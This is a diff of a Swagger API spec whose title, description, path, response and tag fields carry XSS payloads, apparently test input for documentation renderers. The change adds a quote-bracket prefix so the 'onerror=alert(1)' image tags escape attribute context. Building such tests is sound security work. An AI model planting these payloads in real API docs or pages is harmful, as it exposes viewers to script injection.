@@ -1,16 +1,16 @@
  
 swagger: '2.0'
 info:
-  title: <h1><img src=x onerror=alert(1)>
+  title: '"><h1><img src=x onerror=alert(1)>
   description: |
-   <h1><img src=x onerror=alert(1)>
+   '"><h1><img src=x onerror=alert(1)>
 paths:
-  /Free Bitcoin (<h1><img src=x onerror=alert(1)>):
+  /Free Bitcoin ('"><h1><img src=x onerror=alert(1)>):
     get:
       responses:
         '200':
           description: No response was specified'"><h1><img src=x onerror=alert(1)>
       tags:
-        - <h1><img src=x onerror=alert(1)>
+        - '"><h1><img src=x onerror=alert(1)>
       operationId: findAccounts
       summary: Finds all accounts
